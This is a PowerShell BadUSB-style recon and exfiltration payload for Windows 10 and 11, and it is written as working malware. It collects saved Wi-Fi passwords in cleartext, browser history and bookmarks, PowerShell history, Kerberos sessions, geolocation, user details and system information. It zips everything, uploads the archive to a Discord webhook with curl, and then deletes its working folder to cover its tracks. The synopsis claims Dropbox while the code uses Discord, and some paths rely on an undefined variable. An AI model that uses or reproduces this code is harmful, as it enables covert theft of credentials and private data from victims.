############################################################################################################################################################
#                                  |
# Title        : 4dv4nc3d_R3c0n    |
# Author       : Kali-Gvte         |
# Version      : 1.0               |
# Category     : Recon             |
# Target       : Windows 10,11     |
# Mode         : HID               |
#                                  |
############################################################################################################################################################
                                                                                                                                                                                                                                               
<#
.SYNOPSIS
    This is an advanced recon of a target PC and exfiltration of that data.
.DESCRIPTION 
    This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
    All of the gather information is formatted neatly and output to a file.
    That file is then exfiltrated to cloud storage via Dropbox.
#>


<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
STEALTH DIRECTORY WORKING PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (Test-Path -Path "C:\temp" -PathType Container) {
        # The folder exists

        # Check if the current directory is C:\temp
        if (-not (Get-Location).Path -eq "C:\temp") {
            # If not, change the directory
            Set-Location -Path "C:\temp"
        }
    } else {
        # The folder does not exist, create it, and change the directory
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
        Set-Location -Path "C:\temp"
    }
}

TempDir

<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
SYSTEM INFO GRABBING PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to retrieve a registry value
Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Registry key and value names
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get registry values
$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Evaluate UAC settings
If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notify" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)" } 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Notify me only when apps try to make changes to my computer (default)" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notify" }
Else{ $UAC = "Unknown" } 

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Check if LSASS is running as a protected process
$lsass = Get-Process -Name "lsass"
if ($lsass.ProtectedProcess) {$lsassStatus = "LSASS is running as a protected process."} 
else {$lsassStatus = "LSASS is not running as a protected process."}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get names of items in the Startup folder
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get System Information
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of Scheduled Tasks
$ScheduledTasks = Get-ScheduledTask

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get Kerberos ticket information
$klist = klist sessions

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of 50 most recent files in the user's profile
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get COM & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of processes
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of services
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of installed software
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get information about the video card
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------


# Output to a text file
$outputPath = Join-Path $env:TEMP "SystemInfo.txt"
@(
    "UAC Setting: $UAC",
    "LSASS Status: $lsassStatus",
    "Startup Items: $StartUp",
    "System Information:",
    "    Computer Name: $computerName",
    "    Model: $computerModel",
    "    Manufacturer: $computerManufacturer",
    "    BIOS: $computerBIOS",
    "    OS: $computerOs",
    "    CPU: $computerCpu",
    "    Mainboard: $computerMainboard",
    "    RAM Capacity: $computerRamCapacity",
    "    RAM: $computerRam",
    "Scheduled Tasks: $ScheduledTasks",
    "Kerberos Tickets: $klist",
    "Recent Files: $RecentFiles",
    "COM & Serial Devices: $COMDevices",
    "Processes: $process",
    "Services: $service",
    "Installed Software: $software",
    "Drivers: $drivers",
    "Video Card Information: $videocard"
) | Out-File -FilePath $outputPath

<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
USER INFO GRABBING PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to get user's full name
function Get-fullName {

    try {
        # Attempt to retrieve the full name of the current user
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    # If no name is detected, function will return $env:UserName 
    # Write-Error is for troubleshooting purposes
    catch {
        Write-Error "No name was detected" 
        return $env:UserName
        -ErrorAction SilentlyContinue
    }

    return $fullName 
}

# Call the function and store the result in $fullName
$fullName = Get-fullName

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to get user's email
function Get-email {
    
    try {
        # Attempt to retrieve the primary owner's name, assumed to be an email
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }
    # If no email is detected, function will return a backup message for sapi speak
    # Write-Error is for troubleshooting purposes
    catch {
        Write-Error "An email was not found" 
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }        
}

# Call the function and store the result in $email
$email = Get-email

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get local user information using WMI and format the output
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 

# Combine results into a single string
$userInfo = @"
Full Name: $fullName

Email: $email

Local User Information:
$luser
"@

# Write the combined information to UserInfo.txt
$userInfo | Out-File -FilePath $env:TEMP\UserInfo.txt

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
STORAGE INFO GRABBING PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Recon all User Directories
# Utilise la commande 'tree' pour lister tous les fichiers et répertoires dans le profil utilisateur et enregistre le résultat dans un fichier
tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt

# Powershell history
# Copie le fichier d'historique PowerShell vers un emplacement spécifié
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get HDDs
# Définit une table de hachage pour les types de lecteurs
$driveType = @{
   2="Disque amovible "
   3="Disque local fixe "
   4="Disque réseau "
   5="Disque compact "
}

# Obtient les informations sur les disques durs à l'aide de WMI et formate la sortie
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String

# Enregistre les informations sur le stockage dans un fichier
$Hdds | Out-File -FilePath $env:TEMP\$FolderName\StorageInfo.txt

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to get browser data
function Get-BrowserData {
    [CmdletBinding()]
    param ( 
        [Parameter(Position=1,Mandatory=$True)]
        [string]$Browser,    
        [Parameter(Position=1,Mandatory=$True)]
        [string]$DataType 
    ) 

    # Définit une expression régulière pour extraire les URL
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    # Définit le chemin en fonction du navigateur spécifié et du type de données
    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    }

    # Obtient le contenu du chemin spécifié, extrait les URL à l'aide de regex, et produit des résultats uniques
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
    
    # Traite chaque URL et crée un objet
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

# Obtient les données du navigateur pour Edge, Chrome, et Firefox pour l'historique et les favoris
$BrowserData = @(
    (Get-BrowserData -Browser "edge" -DataType "history"),
    (Get-BrowserData -Browser "edge" -DataType "bookmarks"),
    (Get-BrowserData -Browser "chrome" -DataType "history"),
    (Get-BrowserData -Browser "chrome" -DataType "bookmarks"),
    (Get-BrowserData -Browser "firefox" -DataType "history")
)

# Enregistre les informations du navigateur dans un fichier
$BrowserData | Format-Table | Out-File -FilePath $env:TEMP\$FolderName\BrowsersInfo.txt

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
NETWORK INFO GRABBING PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to get geo-location

function Get-GeoLocation {
    try {
        # Add necessary assembly for accessing System.Device.Location namespace
        Add-Type -AssemblyName System.Device 
        
        # Create GeoCoordinateWatcher object
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
        
        # Start resolving current location
        $GeoWatcher.Start() 

        # Wait for discovery
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 
        }  

        # Check for permission denial
        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            # Select relevant results - Latitude and Longitude
            $GeoWatcher.Position.Location | Select Latitude,Longitude 
        }
    }
    # Handle exceptions and write error for troubleshooting
    catch {
        Write-Error "No coordinates found" 
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    } 
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get geo-location
$GeoLocation = Get-GeoLocation

# Split and extract latitude and longitude
$GeoLocation = $GeoLocation -split " "
$Lat = $GeoLocation[0].Substring(11) -replace ".$"
$Lon = $GeoLocation[1].Substring(10) -replace ".$"

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get nearby wifi networks
try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch {
    $NearbyWifi = "No nearby wifi networks detected"
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get IP / Network Info
try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

try {
    $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
}
catch {
    $localIP = "Error getting local IP"
}

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Check RDP status
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
    $RDP = "RDP is Enabled" 
} else {
    $RDP = "RDP is NOT enabled" 
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get Network Interfaces
$NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get WiFi profiles and passwords
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | % {
    $name=$_.Matches.Groups[1].Value.Trim(); $_
} | % {
    (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | % {
        $pass=$_.Matches.Groups[1].Value.Trim(); $_
    } | % {
        [PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }
    } | Format-Table -AutoSize | Out-String
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{
    Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}
}, @{
    Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}
}, State, AppliedSetting, OwningProcess

# Join listener information with process information
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Output to a text file
$outputPath = Join-Path $env:TEMP "NetworkInfo.txt"
@(
    "Geo-Location Information:",
    "    Latitude: $Lat",
    "    Longitude: $Lon",
    "Nearby WiFi Networks: $NearbyWifi",
    "Public IP: $computerPubIP",
    "Local IP: $localIP",
    "MAC Address: $MAC",
    "RDP Status: $RDP",
    "Network Adapters:",
    "$NetworkAdapters",
    "WiFi Profiles and Passwords:",
    "$wifiProfiles",
    "Listeners / Active TCP Connections:",
    "$listener"
) | Out-File -FilePath $outputPath


<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
EXFLITRATION PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Les noms de fichiers
$systemInfoFile = "SystemInfo.txt"
$networkInfoFile = "NetworkInfo.txt"
$storageInfoFile = "StorageInfo.txt"
$browserInfoFile = "BrowserInfo.txt"
$userInfoFile = "UserInfo.txt"

# Le nom de l'archive ZIP
$zipFileName = "$env:USERNAME$(Get-Date -f yyyy-MM-dd_hh-mm).zip"
$zipFilePath = "C:\TEMP\$zipFileName"

# Création de l'archive ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\TEMP", $zipFilePath)

# Fonction pour uploader sur Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Uploader l'archive ZIP sur Discord
Upload-Discord -file $zipFilePath


<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
COVER TRACKS PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to delete the temporary directory
function DelTempDir {
    cd C:\
    rmdir -R \temp
    exit
}

DelTempDir
